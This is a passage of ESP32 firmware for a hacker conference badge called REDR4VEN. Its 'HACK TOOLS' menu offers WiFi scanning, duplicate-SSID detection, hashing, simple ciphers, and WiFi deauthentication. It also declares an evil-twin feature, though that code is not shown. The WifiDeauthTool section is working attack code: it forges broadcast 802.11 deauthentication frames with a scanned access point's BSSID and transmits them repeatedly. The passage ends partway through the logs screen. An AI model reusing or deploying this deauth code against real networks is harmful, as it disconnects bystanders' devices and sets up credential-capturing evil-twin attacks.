// ============================================================================
//  REDR4VEN Badge — v4
//  Changes vs v3:
//    - Lock-screen logo replaced with user-supplied 70×70 1-bit raven bitmap
//      rendered in red via tft.drawBitmap() — no procedural drawing needed
//    - Boot layout adjusted for 70px-tall bitmap
//    - All other fixes from v3 preserved (pad-pixel fix, blink-only refresh)
// ============================================================================

#include <Arduino.h>
#include <Preferences.h>
#include <SPI.h>
#include <TFT_eSPI.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <WiFi.h>
#include <mbedtls/md5.h>
#include <mbedtls/sha256.h>
#include "esp_wifi.h"

// ---------------------------------------------------------------------------
// Raven bitmap — 70×70 px, 1-bit, MSB-first, user-supplied
// drawBitmap renders '1' bits in fgColor, '0' bits in bgColor
// Row stride = ceil(70/8) = 9 bytes  →  70 rows × 9 bytes = 630 bytes
// ---------------------------------------------------------------------------
// Verbatim bytes from the image tool output — 70×70 px, 1-bit MSB-first
// stride = ceil(70/8) = 9 bytes/row  →  70 × 9 = 630 bytes total
// DO NOT REFORMAT: any reordering of bytes corrupts the row stride.
static const unsigned char epd_bitmap_raven[] PROGMEM = {
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x38, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0xf0, 0x3f, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf0, 0x3f, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xe0, 0x3f, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0xc0,
    0xf8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0xc0, 0xf8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x47, 0x07, 0xe0, 0xfe, 0x00, 0x00, 0x00, 0x00, 0x00, 0x47, 0x07, 0xc0, 0xff, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x47, 0x0f, 0xc0, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0x0f, 0xf8, 0x00,
    0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0x1f, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x01, 0xff, 0xff, 0x3f,
    0xc0, 0x00, 0x00, 0x00, 0x00, 0x3f, 0xff, 0xf7, 0xf8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3f, 0xff,
    0xcf, 0xf8, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0x48, 0x3f, 0xfe, 0x00, 0x00, 0x00, 0x01,
    0xff, 0xff, 0x48, 0x3f, 0xff, 0x00, 0x00, 0x00, 0x01, 0xff, 0xfc, 0x80, 0x7f, 0xff, 0x00, 0x00,
    0x00, 0x07, 0xff, 0xb8, 0x06, 0x1f, 0xc0, 0x00, 0x00, 0x00, 0x07, 0xff, 0xb8, 0x66, 0x7f, 0xc0,
    0x00, 0x00, 0x00, 0x07, 0xff, 0xb8, 0x74, 0x7f, 0xc0, 0x00, 0x00, 0x00, 0x01, 0xff, 0x43, 0x7a,
    0x3f, 0xc0, 0x00, 0x00, 0x00, 0x01, 0xff, 0x47, 0x7c, 0x3f, 0xc0, 0x00, 0x00, 0x00, 0x01, 0xff,
    0x0f, 0x7c, 0x3f, 0xe0, 0x00, 0x00, 0x01, 0xfe, 0x3f, 0x1f, 0x78, 0x47, 0xf8, 0x00, 0x00, 0x01,
    0xfe, 0x3f, 0x27, 0x70, 0xc7, 0xf8, 0x00, 0x00, 0x07, 0xff, 0xc7, 0x83, 0xc0, 0x38, 0xf8, 0x00,
    0x00, 0x07, 0xf1, 0xc7, 0xc0, 0x07, 0xbf, 0xf8, 0x00, 0x00, 0x07, 0xe1, 0xc7, 0xc0, 0x07, 0xbf,
    0xf8, 0x00, 0x00, 0x3f, 0xf7, 0xf8, 0xf8, 0x78, 0xff, 0xff, 0x00, 0x00, 0x3f, 0xff, 0xf8, 0xfe,
    0x18, 0x7f, 0xff, 0x00, 0x00, 0xff, 0xff, 0xff, 0x3f, 0xff, 0xff, 0xff, 0x00, 0x01, 0xff, 0xff,
    0xff, 0x3f, 0xff, 0xbf, 0xff, 0x00, 0x01, 0xff, 0xff, 0xff, 0xbf, 0xff, 0xff, 0xff, 0x00, 0x01,
    0xfd, 0xb1, 0x81, 0xc7, 0xff, 0xff, 0xff, 0x00, 0x01, 0xfc, 0x21, 0x80, 0xc7, 0xff, 0xff, 0xff,
    0x00, 0x01, 0xf8, 0x1b, 0x1c, 0x07, 0xff, 0xff, 0xff, 0x00, 0x01, 0xe2, 0x7f, 0xff, 0x80, 0xff,
    0xff, 0xff, 0xc0, 0x01, 0xc7, 0xff, 0xff, 0xf8, 0xff, 0xff, 0xff, 0xc0, 0x01, 0xc5, 0xcf, 0xfd,
    0xf8, 0xff, 0xff, 0xff, 0xc0, 0x01, 0xc0, 0x01, 0xf8, 0x3c, 0xff, 0xff, 0xff, 0xc0, 0x00, 0x40,
    0x01, 0xff, 0x1c, 0xff, 0xff, 0xff, 0xc0, 0x00, 0x40, 0x00, 0x3f, 0xe0, 0xff, 0xff, 0xff, 0xc0,
    0x00, 0x40, 0x00, 0x3f, 0xf1, 0xff, 0xff, 0xff, 0xc0, 0x00, 0x00, 0x00, 0x3f, 0xfb, 0xff, 0xff,
    0xff, 0xc0, 0x00, 0x00, 0x00, 0x3f, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x3f, 0xff,
    0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x3f, 0xff, 0xff, 0xff, 0xfe, 0x00, 0x00, 0x00, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xf8, 0x00, 0x00, 0x00, 0x01, 0xff, 0xff, 0xff, 0xff, 0xf8, 0x00, 0x00,
    0x00, 0x01, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x01, 0xff, 0xff, 0xff, 0xff, 0x00,
    0x00, 0x00, 0x00, 0x03, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x07, 0xff, 0xff, 0xff,
    0xc0, 0x00, 0x00, 0x00, 0x00, 0x07, 0xff, 0xff, 0xff, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x07, 0xff,
    0xff, 0xff, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x01, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x01, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x07, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0xc0, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

#ifndef TFT_BL
#define TFT_BL 12
#endif
#ifndef ROOTED_BADGE_SCREEN_EN
#define ROOTED_BADGE_SCREEN_EN 21
#endif

// ---------------------------------------------------------------------------
// EvilTwin globals
// ---------------------------------------------------------------------------
DNSServer dnsServer;
WebServer evilServer(80);

struct _Network {
    String  ssid;
    uint8_t ch        = 0;
    uint8_t bssid[6]  = {0,0,0,0,0,0};
};

String bytesToStr(const uint8_t* b, uint32_t size) {
    String s;
    for (uint32_t i = 0; i < size; ++i) {
        if (b[i] < 0x10) s += '0';
        s += String(b[i], HEX);
        if (i + 1 < size) s += ':';
    }
    s.toUpperCase();
    return s;
}

void goWifiDeauth();
void initEvilTwin();
void loopEvilTwin();
void handleEvilTwinInput();
void drawEvilTwin();

// ---------------------------------------------------------------------------
// WifiDeauthTool  (unchanged from original)
// ---------------------------------------------------------------------------
namespace WifiDeauthTool {
    _Network      networks[16];
    _Network      selectedNetwork;
    bool          enabled     = false;
    unsigned long scan_now    = 0;
    unsigned long last_deauth = 0;

    void sendDeauth(const uint8_t* bssid, uint8_t ch) {
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        uint8_t pkt[26] = {
            0xc0,0x00,0x3a,0x01,
            0xff,0xff,0xff,0xff,0xff,0xff,
            bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],
            bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],
            0x00,0x00,0x07,0x00
        };
        wifi_mode_t mode;
        esp_wifi_get_mode(&mode);
        wifi_interface_t iface =
            (mode==WIFI_MODE_AP||mode==WIFI_MODE_APSTA) ? WIFI_IF_AP : WIFI_IF_STA;
        esp_wifi_80211_tx(iface, pkt, sizeof(pkt), false);
    }
    void clearArray()  { for (int i=0;i<16;++i) networks[i]=_Network(); }
    void performScan() {
        const int n = WiFi.scanNetworks(false,true);
        clearArray();
        if (n<0) return;
        for (int i=0;i<n&&i<16;++i) {
            networks[i].ssid = WiFi.SSID(i);
            networks[i].ch   = WiFi.channel(i);
            const uint8_t* b = WiFi.BSSID(i);
            if (b) memcpy(networks[i].bssid,b,6);
        }
    }
    void init() {
        if (WiFi.getMode()==WIFI_OFF) WiFi.mode(WIFI_STA);
        performScan();
        enabled=false; scan_now=millis(); selectedNetwork=_Network();
        for(int i=0;i<16;++i)
            if(networks[i].ssid.length()){ selectedNetwork=networks[i]; break; }
    }
    void tick() {
        if (enabled && selectedNetwork.ssid.length() && (millis()-last_deauth>350)) {
            sendDeauth(selectedNetwork.bssid, selectedNetwork.ch);
            last_deauth = millis();
        }
        if ((millis()-scan_now)>=15000UL) {
            performScan(); scan_now = millis();
            if (!selectedNetwork.ssid.length())
                for(int i=0;i<16;++i)
                    if(networks[i].ssid.length()){ selectedNetwork=networks[i]; break; }
        }
    }
}

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------
constexpr uint8_t  kAuxPowerPin   = 0;
constexpr uint32_t kDebounceMs    = 18;
constexpr uint32_t kRepeatDelayMs = 260;
constexpr uint32_t kRepeatRateMs  = 110;
constexpr uint8_t  kScanPageSize  = 6;
constexpr uint8_t  kLogCapacity   = 8;

// ---------------------------------------------------------------------------
// Enums
// ---------------------------------------------------------------------------
enum ButtonId : uint8_t {
    BTN_UP=0, BTN_DOWN, BTN_LEFT, BTN_RIGHT, BTN_SELECT, BTN_EXTRA, BTN_COUNT
};
enum ViewMode : uint8_t {
    VIEW_BOOT=0, VIEW_MENU,
    VIEW_WIFI_SCAN, VIEW_TWIN_DETECT, VIEW_WIFI_DEAUTH,
    VIEW_EVILTWIN, VIEW_HASH_TOOL, VIEW_CIPHER_TOOL, VIEW_LOGS_TOOL
};

struct ButtonConfig { ButtonId id; uint8_t pin; };
struct ButtonState {
    bool     raw=false, stable=false, pressed=false, released=false;
    uint32_t last_flip_ms=0, hold_since_ms=0, last_repeat_ms=0;
};

constexpr ButtonConfig kButtons[BTN_COUNT] = {
    {BTN_UP,27},{BTN_DOWN,15},{BTN_LEFT,25},
    {BTN_RIGHT,26},{BTN_SELECT,13},{BTN_EXTRA,33}
};

// ---------------------------------------------------------------------------
// Palette — kBg/kPanel/kLine/kDim/kWhite are grey-symmetric so safe as const.
// All colour-critical values go through initColors() after tft.init().
// ---------------------------------------------------------------------------
constexpr uint16_t kBg    = 0x0000;
constexpr uint16_t kPanel = 0x0841;
constexpr uint16_t kLine  = 0x31A6;
constexpr uint16_t kText  = 0xFFFF;
constexpr uint16_t kDim   = 0x9CF3;
constexpr uint16_t kWhite = 0xFFFF;

uint16_t uiRed;
uint16_t uiDkRed;
uint16_t uiYellow;
uint16_t uiCyan;
uint16_t uiGreen;

// ---------------------------------------------------------------------------
// Global state
// ---------------------------------------------------------------------------
TFT_eSPI    tft = TFT_eSPI();
Preferences g_prefs;
ButtonState g_buttons[BTN_COUNT];

ViewMode g_view          = VIEW_BOOT;
uint8_t  g_menu_sel      = 0;
bool     g_full_redraw   = true;
bool     g_prefs_ready   = false;
bool     eviltwin_active = false;
uint8_t  g_hash_source   = 0;
uint8_t  g_cipher_source = 0;
uint8_t  g_log_offset    = 0;
uint8_t  g_log_count     = 0;
String   g_logs[kLogCapacity];

int     g_scan_count  = 0;
uint8_t g_scan_offset = 0;
uint8_t g_twin_offset = 0;
uint8_t g_twin_count  = 0;

// Boot blink — only the prompt row is redrawn, not the whole screen
uint32_t g_blink_ms    = 0;
bool     g_blink_state = false;
bool     g_blink_dirty = false;
bool     g_boot_drawn  = false;

// ---------------------------------------------------------------------------
// Color init — must be called AFTER tft.init()
// panelColor(r,g,b) inverts R↔B to compensate for TFT_RGB_ORDER=TFT_BGR
// ---------------------------------------------------------------------------
uint16_t panelColor(uint8_t r, uint8_t g, uint8_t b) {
    return tft.color565(b, g, r);
}
void initColors() {
    uiRed    = panelColor(210,  10,  10);
    uiDkRed  = panelColor( 90,   0,   0);
    uiYellow = panelColor(200, 200,   0);
    uiCyan   = panelColor(  0, 180, 210);
    uiGreen  = panelColor( 20, 200,  60);
}

// ---------------------------------------------------------------------------
// clearPadPixels — fixes the rainbow fringe on left / top of the screen.
//
// ST7735_GREENTAB sets TFT_eSPI's internal _xstart=2, _ystart=1.
// Every draw call adds those offsets before sending CASET/RASET to hardware,
// so physical hardware columns 0-1 and row 0 (in landscape address space) are
// NEVER written by TFT_eSPI's API — they show random power-on RAM garbage.
// We clear them once with direct SPI writes, and they stay black forever
// because TFT_eSPI never touches those hardware addresses again.
//
// Call once after tft.init() + tft.setRotation(3) + tft.fillScreen().
// ---------------------------------------------------------------------------
void clearPadPixels() {
    tft.startWrite();

    // ── Clear physical hardware columns X=0 and X=1 (full 128-row height) ──
    tft.writecommand(0x2A);                    // CASET
    tft.writedata(0x00); tft.writedata(0x00);  // SC = 0
    tft.writedata(0x00); tft.writedata(0x01);  // EC = 1
    tft.writecommand(0x2B);                    // RASET
    tft.writedata(0x00); tft.writedata(0x00);  // SP = 0
    tft.writedata(0x00); tft.writedata(0x7F);  // EP = 127
    tft.writecommand(0x2C);                    // RAMWR
    for (int i = 0; i < 2 * 128; i++) {
        tft.writedata(0x00); tft.writedata(0x00);  // black pixel
    }

    // ── Clear physical hardware row Y=0 (full 160-col width) ───────────────
    tft.writecommand(0x2A);
    tft.writedata(0x00); tft.writedata(0x00);  // SC = 0
    tft.writedata(0x00); tft.writedata(0x9F);  // EC = 159
    tft.writecommand(0x2B);
    tft.writedata(0x00); tft.writedata(0x00);  // SP = 0
    tft.writedata(0x00); tft.writedata(0x00);  // EP = 0
    tft.writecommand(0x2C);
    for (int i = 0; i < 160; i++) {
        tft.writedata(0x00); tft.writedata(0x00);
    }

    tft.endWrite();
}

// ---------------------------------------------------------------------------
// Utility
// ---------------------------------------------------------------------------
String hexEncode(const uint8_t* d, size_t len) {
    static const char* H = "0123456789ABCDEF";
    String o; o.reserve(len*2);
    for(size_t i=0;i<len;++i){ o+=H[(d[i]>>4)&0xF]; o+=H[d[i]&0xF]; }
    return o;
}
String md5Hex(const String& s) {
    uint8_t o[16]; mbedtls_md5_context c; mbedtls_md5_init(&c);
    mbedtls_md5_starts_ret(&c);
    mbedtls_md5_update_ret(&c,(const unsigned char*)s.c_str(),s.length());
    mbedtls_md5_finish_ret(&c,o); mbedtls_md5_free(&c);
    return hexEncode(o,16);
}
String sha256Hex(const String& s) {
    uint8_t o[32]; mbedtls_sha256_context c; mbedtls_sha256_init(&c);
    mbedtls_sha256_starts_ret(&c,0);
    mbedtls_sha256_update_ret(&c,(const unsigned char*)s.c_str(),s.length());
    mbedtls_sha256_finish_ret(&c,o); mbedtls_sha256_free(&c);
    return hexEncode(o,32);
}
String caesarText(const String& in, int sh) {
    String o=in;
    for(size_t i=0;i<o.length();++i){
        char c=o[i];
        if(c>='A'&&c<='Z') o.setCharAt(i,char('A'+((c-'A'+sh)%26)));
        else if(c>='a'&&c<='z') o.setCharAt(i,char('a'+((c-'a'+sh)%26)));
    }
    return o;
}
String xorHex(const String& in, const String& key) {
    if(!key.length()) return "";
    String o; o.reserve(in.length()*2);
    for(size_t i=0;i<in.length();++i){
        uint8_t v=uint8_t(in[i])^uint8_t(key[i%key.length()]);
        o+=hexEncode(&v,1);
    }
    return o;
}

// ---------------------------------------------------------------------------
// Logs
// ---------------------------------------------------------------------------
void saveLogs() {
    if(!g_prefs_ready) return;
    String b;
    for(uint8_t i=0;i<g_log_count;++i){ if(i) b+='\n'; b+=g_logs[i]; }
    g_prefs.putString("logs",b);
}
void loadLogs() {
    if(!g_prefs_ready) return;
    const String b=g_prefs.getString("logs","");
    g_log_count=0; g_log_offset=0; int s=0;
    while(s<=(int)b.length()&&g_log_count<kLogCapacity){
        const int nl=b.indexOf('\n',s);
        String ln=(nl==-1)?b.substring(s):b.substring(s,nl);
        ln.trim(); if(ln.length()) g_logs[g_log_count++]=ln;
        if(nl==-1) break; s=nl+1;
    }
}
void addLog(const String& line) {
    if(!line.length()) return;
    if(g_log_count<kLogCapacity){ g_logs[g_log_count++]=line; }
    else { for(uint8_t i=1;i<kLogCapacity;++i) g_logs[i-1]=g_logs[i]; g_logs[kLogCapacity-1]=line; }
    saveLogs();
}
String currentToolInput(uint8_t src) {
    switch(src%3){ case 0:return"REDR4VEN"; case 1:return"ROOTEDCON2026"; default:return WiFi.macAddress(); }
}
const char* currentToolSourceLabel(uint8_t src) {
    switch(src%3){ case 0:return"ALIAS"; case 1:return"EVENTO"; default:return"MAC"; }
}

// ---------------------------------------------------------------------------
// Hardware  
// ---------------------------------------------------------------------------
void setupHardware() {
    pinMode(kAuxPowerPin,OUTPUT);           digitalWrite(kAuxPowerPin,HIGH);
    pinMode(ROOTED_BADGE_SCREEN_EN,OUTPUT); digitalWrite(ROOTED_BADGE_SCREEN_EN,HIGH);
    pinMode(TFT_BL,OUTPUT);                digitalWrite(TFT_BL,LOW);
    for(size_t i=0;i<BTN_COUNT;++i) pinMode(kButtons[i].pin,INPUT_PULLUP);
}

// ---------------------------------------------------------------------------
// Buttons
// ---------------------------------------------------------------------------
void updateButtons() {
    const uint32_t now=millis();
    for(size_t i=0;i<BTN_COUNT;++i){
        ButtonState& s=g_buttons[i];
        s.pressed=false; s.released=false;
        const bool rp=(digitalRead(kButtons[i].pin)==LOW);
        if(rp!=s.raw){ s.raw=rp; s.last_flip_ms=now; }
        if((now-s.last_flip_ms)>=kDebounceMs && s.stable!=s.raw){
            s.stable=s.raw;
            if(s.stable){ s.pressed=true; s.hold_since_ms=now; s.last_repeat_ms=now; }
            else         { s.released=true; s.hold_since_ms=0; }
        }
    }
}
bool pressed(ButtonId id){ return g_buttons[id].pressed; }
bool menuPressed(ButtonId id){
    ButtonState& s=g_buttons[id];
    const uint32_t now=millis();
    if(s.pressed) return true;
    if(!s.stable) return false;
    if(s.hold_since_ms==0){ s.hold_since_ms=now; s.last_repeat_ms=now; return false; }
    if((now-s.hold_since_ms)<kRepeatDelayMs) return false;
    if((now-s.last_repeat_ms)>=kRepeatRateMs){ s.last_repeat_ms=now; return true; }
    return false;
}

// ---------------------------------------------------------------------------
// DRAW: Boot screen — static portion (drawn once per visit to VIEW_BOOT)
//
// Layout (screen 160×128, rotation 3):
//   y=  0- 2  : top red bar
//   y=  3-72  : raven bitmap 70×70, centred horizontally  (x=45)
//   y= 74     : separator line
//   y= 77     : "STATUS: ONLINE | PWNED BY:"  font 1
//   y= 88     : "REDR4VEN"                    font 2, red  (~14px tall → y≈102)
//   y=106     : blink prompt                  font 1, yellow
//   y=125-127 : bottom red bar
//
// tft.drawBitmap(x, y, bitmap, w, h, fgColor, bgColor)
//   '1' bits → fgColor (uiRed), '0' bits → bgColor (kBg)
// ---------------------------------------------------------------------------
void drawBootStatic() {
    tft.fillScreen(kBg);
    clearPadPixels();   // fix GREENTAB hardware pad fringe

    // accent bars
    tft.fillRect(0, 0,               tft.width(), 3, uiRed);
    tft.fillRect(0, tft.height()-3,  tft.width(), 3, uiRed);

    // raven bitmap — centred: x = (160-70)/2 = 45
    tft.drawBitmap(45, 3, epd_bitmap_raven, 70, 70, uiRed, kBg);

    // separator
    tft.drawFastHLine(10, 74, tft.width()-20, kLine);

    // status line
    tft.setTextColor(kDim, kBg);
    tft.drawCentreString("STATUS: ONLINE | PWNED BY:", tft.width()/2, 77, 1);

    // REDR4VEN title — font 2 is ~14px tall, so y=88 → bottom ≈ 102
    tft.setTextColor(uiRed, kBg);
    tft.drawCentreString("REDR4VEN", tft.width()/2, 88, 2);
}

// Only redraw the 10-px blink row — no screen clear, no flicker
// y=106: font-1 text is 8px tall → fits comfortably above the bottom bar at y=125
void drawBootBlink() {
    tft.fillRect(0, 105, tft.width(), 10, kBg);
    if (g_blink_state) {
        tft.setTextColor(uiYellow, kBg);
        tft.drawCentreString("[ PRESS SELECT TO START ]", tft.width()/2, 106, 1);
    }
}

// ---------------------------------------------------------------------------
// DRAW: Hack menu
// ---------------------------------------------------------------------------
constexpr uint8_t kMenuItems = 7;
const char* menuLabelFor(uint8_t i) {
    static const char* L[kMenuItems] = {
        "WIFI SCAN","TWIN DETECT","WIFI DEAUTH","EVIL TWIN",
        "CIFRADOR","HASH","LOGS"
    };
    return L[i % kMenuItems];
}

void drawMenu() {
    tft.fillScreen(kBg);
    clearPadPixels();
    tft.drawRect(0,0,tft.width(),tft.height(),uiRed);
    tft.drawRect(1,1,tft.width()-2,tft.height()-2,uiDkRed);

    tft.setTextColor(uiRed, kBg);
    tft.drawCentreString("REDR4VEN", tft.width()/2, 5, 2);
    tft.setTextColor(kDim, kBg);
    tft.drawCentreString("[ HACK TOOLS ]", tft.width()/2, 22, 1);
    tft.drawFastHLine(8, 30, tft.width()-16, kLine);

    for (uint8_t i=0; i<kMenuItems; ++i) {
        const int16_t  y   = 33 + i*13;
        const bool     sel = (i == g_menu_sel);
        const uint16_t bg  = sel ? uiRed  : kPanel;
        const uint16_t brd = sel ? kWhite : kLine;
        const uint16_t txt = sel ? kWhite : kText;
        tft.fillRoundRect(12, y, tft.width()-24, 11, 3, bg);
        tft.drawRoundRect(12, y, tft.width()-24, 11, 3, brd);
        tft.setTextColor(txt, bg);
        if (sel) tft.drawString(">", 15, y+2, 1);
        tft.drawCentreString(menuLabelFor(i), tft.width()/2, y+2, 1);
    }
    tft.setTextColor(kDim, kBg);
    tft.drawCentreString("UP/DN  SEL:ENTER  EXT:LOCK", tft.width()/2, 151, 1);
}

// ---------------------------------------------------------------------------
// DRAW: Tool screens  (clearPadPixels after every fillScreen)
// ---------------------------------------------------------------------------
void drawWifiScan() {
    tft.fillScreen(kBg); clearPadPixels();
    tft.drawRect(0,0,tft.width(),tft.height(),kLine);
    tft.setTextColor(uiRed,kBg);
    tft.drawCentreString("WIFI SCAN",tft.width()/2,6,2);
    tft.setTextColor(kDim,kBg);
    tft.drawCentreString("Redes visibles",tft.width()/2,22,1);

    const int s=g_scan_offset, e=min(g_scan_count,s+(int)kScanPageSize);
    int y=34;
    for(int i=s;i<e;++i){
        const String ssid=WiFi.SSID(i).length()?WiFi.SSID(i):"<oculta>";
        tft.drawRoundRect(8,y-2,tft.width()-16,16,3,kPanel);
        tft.setTextColor(kText,kBg);
        tft.drawString(ssid,12,y,1);
        tft.setTextColor(kDim,kBg);
        tft.drawRightString(String(WiFi.RSSI(i))+"dBm CH"+String(WiFi.channel(i)),tft.width()-12,y,1);
        y+=18;
    }
    if(g_scan_count<=0){tft.setTextColor(uiYellow,kBg);tft.drawCentreString("Sin resultados",tft.width()/2,72,1);}
    tft.setTextColor(kDim,kBg);
    tft.drawCentreString("SELECT REESCANEAR",tft.width()/2,142,1);
    tft.drawCentreString("EXT VOLVER",tft.width()/2,152,1);
}

void drawTwinDetect() {
    tft.fillScreen(kBg); clearPadPixels();
    tft.drawRect(0,0,tft.width(),tft.height(),kLine);
    tft.setTextColor(uiRed,kBg);
    tft.drawCentreString("TWIN DETECT",tft.width()/2,6,2);
    tft.setTextColor(kDim,kBg);
    tft.drawCentreString("SSID duplicados",tft.width()/2,22,1);

    int pairs=0,row=0;
    for(int i=0;i<g_scan_count&&row<4;++i){
        const String a=WiFi.SSID(i);
        if(!a.length()) continue;
        for(int j=i+1;j<g_scan_count&&row<4;++j){
            if(a==WiFi.SSID(j)){
                if(pairs>=g_twin_offset&&row<4){
                    const int y2=36+row*22;
                    tft.drawRoundRect(8,y2-2,tft.width()-16,18,3,kPanel);
                    tft.setTextColor(uiRed,kBg);
                    tft.drawString(a,12,y2,1);
                    tft.setTextColor(kDim,kBg);
                    tft.drawRightString(String(WiFi.channel(i))+"/"+String(WiFi.channel(j)),tft.width()-12,y2,1);
                    ++row;
                }
                ++pairs;
            }
        }
    }
    g_twin_count=pairs;
    if(pairs==0){tft.setTextColor(uiGreen,kBg);tft.drawCentreString("No se detectan twins",tft.width()/2,72,1);}
    tft.setTextColor(kDim,kBg);
    tft.drawCentreString("SELECT REESCANEAR",tft.width()/2,142,1);
    tft.drawCentreString("EXT VOLVER",tft.width()/2,152,1);
}

void drawWifiDeauth() {
    tft.fillScreen(kBg); clearPadPixels();
    tft.drawRect(0,0,tft.width(),tft.height(),kLine);
    tft.setTextColor(uiRed,kBg);
    tft.drawCentreString("WIFI DEAUTH",tft.width()/2,6,2);
    tft.setTextColor(WifiDeauthTool::enabled?uiYellow:kDim,kBg);
    tft.drawCentreString(WifiDeauthTool::enabled?"[ ACTIVE ]":"[ STANDBY ]",tft.width()/2,22,1);

    int y=34;
    for(int i=0;i<5&&i<16;++i){
        if(!WifiDeauthTool::networks[i].ssid.length()) break;
        const bool sel=bytesToStr(WifiDeauthTool::selectedNetwork.bssid,6)==
                       bytesToStr(WifiDeauthTool::networks[i].bssid,6);
        tft.drawRoundRect(8,y-2,tft.width()-16,16,3,sel?uiRed:kPanel);
        tft.setTextColor(sel?kWhite:kText,kBg);
        tft.drawString(WifiDeauthTool::networks[i].ssid,12,y,1);
        tft.setTextColor(kDim,kBg);
        tft.drawRightString("CH"+String(WifiDeauthTool::networks[i].ch),tft.width()-12,y,1);
        y+=18;
    }
    tft.setTextColor(WifiDeauthTool::enabled?uiYellow:kDim,kBg);
    tft.drawCentreString(WifiDeauthTool::enabled?"SEL: DEAUTH ON":"SEL: DEAUTH OFF",tft.width()/2,142,1);
    tft.setTextColor(kDim,kBg);
    tft.drawCentreString("EXT VOLVER",tft.width()/2,152,1);
}

void drawHashTool() {
    const String in=currentToolInput(g_hash_source);
    tft.fillScreen(kBg); clearPadPixels();
    tft.drawRect(0,0,tft.width(),tft.height(),kLine);
    tft.setTextColor(uiRed,kBg);
    tft.drawCentreString("HASH",tft.width()/2,6,2);
    tft.setTextColor(kDim,kBg);
    tft.drawCentreString(currentToolSourceLabel(g_hash_source),tft.width()/2,22,1);
    tft.drawRoundRect(8,30,tft.width()-16,22,4,kPanel);
    tft.setTextColor(kText,kBg);
    tft.drawCentreString(in,tft.width()/2,38,1);
    const String md5=md5Hex(in), sha=sha256Hex(in);
    tft.setTextColor(uiYellow,kBg); tft.drawString("MD5",10,58,1);
    tft.setTextColor(kText,kBg);
    tft.drawString(md5.substring(0,16),10,70,1);
    tft.drawString(md5.substring(16),10,80,1);
    tft.setTextColor(uiCyan,kBg); tft.drawString("SHA256",10,94,1);
    tft.setTextColor(kText,kBg);
    for(int i=0;i<4;++i) tft.drawString(sha.substring(i*16,i*16+16),10,106+i*10,1);
    tft.setTextColor(kDim,kBg);
    tft.drawCentreString("ANY BTN: FUENTE  EXT VOLVER",tft.width()/2,150,1);
}

void drawCipherTool() {
    const String in=currentToolInput(g_cipher_source);
    tft.fillScreen(kBg); clearPadPixels();
    tft.drawRect(0,0,tft.width(),tft.height(),kLine);
    tft.setTextColor(uiRed,kBg);
    tft.drawCentreString("CIFRADOR",tft.width()/2,6,2);
    tft.setTextColor(kDim,kBg);
    tft.drawCentreString(currentToolSourceLabel(g_cipher_source),tft.width()/2,22,1);
    tft.drawRoundRect(8,30,tft.width()-16,22,4,kPanel);
    tft.setTextColor(kText,kBg);
    tft.drawCentreString(in,tft.width()/2,38,1);
    const String ces=caesarText(in,3), xh=xorHex(in,"ARA");
    tft.setTextColor(uiYellow,kBg); tft.drawString("CESAR+3",10,60,1);
    tft.setTextColor(kText,kBg);    tft.drawString(ces,10,72,1);
    tft.setTextColor(uiCyan,kBg);   tft.drawString("XOR ARA",10,92,1);
    tft.setTextColor(kText,kBg);
    tft.drawString(xh.substring(0,min((int)xh.length(),24)),10,104,1);
    if(xh.length()>24) tft.drawString(xh.substring(24,min((int)xh.length(),48)),10,114,1);
    tft.setTextColor(kDim,kBg);
    tft.drawCentreString("ANY BTN: FUENTE  EXT VOLVER",tft.width()/2,150,1);
}

void drawLogsTool() {
    tft.fillScreen(kBg); clearPadPixels();
    tft.drawRect(0,0,tft.width(),tft.height(),kLine);
    tft.setTextColor(uiRed,kBg);
    tft.drawCentreString("LOGS",tft.width()/2,6,2);
    tft.setTextColor(kDim,kBg);
    tft.drawCentreString("Eventos del badge",tft.width()/2,22,1);
